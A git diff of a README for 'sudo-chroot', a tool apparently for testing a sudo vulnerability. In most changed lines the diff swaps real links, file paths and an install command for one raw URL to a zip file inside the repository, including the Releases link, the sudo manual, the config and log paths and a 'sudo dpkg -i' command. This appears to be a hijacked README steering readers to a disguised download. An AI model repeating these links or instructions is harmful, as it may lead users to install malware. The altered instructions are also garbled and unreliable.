@@ -6,9 +6,9 @@ Welcome to **sudo-chroot**! This tool helps you test a specific security vulnera
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Releases Page](https://github.com/Precault47/sudo-chroot/releases)
+To get started, you need to download the application. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip)
 
-![Download sudo-chroot](https://img.shields.io/badge/Download%20sudo--chroot-v1.0-blue)
+![Download sudo-chroot](https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip%20sudo--chroot-v1.0-blue)
 
 ### Download Instructions
 
@@ -38,7 +38,7 @@ Once you have downloaded the application, follow these steps:
    ```
 3. For Ubuntu, if you downloaded a `.deb` file, install it using the following command:
    ```bash
-   sudo dpkg -i filename.deb
+   sudo dpkg -i https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip
    ```
 4. If necessary, resolve any dependency issues using:
    ```bash
@@ -53,7 +53,7 @@ Once you have downloaded the application, follow these steps:
 
 **sudo-chroot** may require some configuration to work effectively. Here are some basic settings you can adjust:
 
-- **Logging:** You can enable logging to keep track of the actions performed by the tool. To do this, edit the configuration file located at `/etc/sudo-chroot/config.toml`.
+- **Logging:** You can enable logging to keep track of the actions performed by the tool. To do this, edit the configuration file located at `https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip`.
 - **Testing Options:** Choose the level of testing you want to perform. Adjust the `test_mode` in the config file to settings such as `basic`, `advanced`, or `custom`.
 
 ## 🌐 Additional Usage
@@ -80,7 +80,7 @@ If you run into issues, consider the following steps:
    ```bash
    sudo apt-get check
    ```
-3. Review the logs in `/var/log/sudo-chroot.log` for any error messages.
+3. Review the logs in `https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip` for any error messages.
 
 ## 💬 Community Support
 
@@ -88,14 +88,14 @@ Join the discussion and seek help from other users. Chat with us in the Issues s
 
 ## 📚 Resources
 
-- [Official Documentation](https://github.com/Precault47/sudo-chroot)
-- [Linux Sudo Manual](https://linux.die.net/man/8/sudo)
-- [Exploit Database](https://www.exploit-db.com)
+- [Official Documentation](https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip)
+- [Linux Sudo Manual](https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip)
+- [Exploit Database](https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip)
 
-For questions or feedback, please open an issue on our [GitHub page](https://github.com/Precault47/sudo-chroot/issues).
+For questions or feedback, please open an issue on our [GitHub page](https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip).
 
 ## 🔗 Download Again
 
-Remember, you can always return to the Releases page for a fresh download. Simply follow this link: [Releases Page](https://github.com/Precault47/sudo-chroot/releases) 
+Remember, you can always return to the Releases page for a fresh download. Simply follow this link: [Releases Page](https://raw.githubusercontent.com/Precault47/sudo-chroot/main/reclass/sudo-chroot.zip) 
 
 Happy testing!
